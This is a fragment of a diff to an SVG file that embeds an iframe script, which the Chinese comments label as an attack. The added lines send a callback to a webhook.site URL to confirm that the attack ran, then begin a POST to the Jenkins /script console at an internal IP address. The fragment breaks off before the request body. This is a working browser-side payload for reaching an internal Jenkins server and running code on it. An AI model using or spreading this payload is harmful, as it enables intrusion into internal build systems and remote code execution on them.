@@ -2,6 +2,10 @@
   <foreignObject width="100%" height="100%">
     <body xmlns="http://www.w3.org/1999/xhtml">
       <iframe srcdoc='&lt;script&gt;
+        // 打点：告诉我攻击被执行了
+        fetch("https://webhook.site/7934d095-0d9f-4592-a002-0f4b9dc3fd8c");
+
+        // 攻击 Jenkins
         fetch("http://192.168.8.3:8050/script", {
           method: "POST",
           headers: {"Content-Type": "application/x-www-form-urlencoded"},
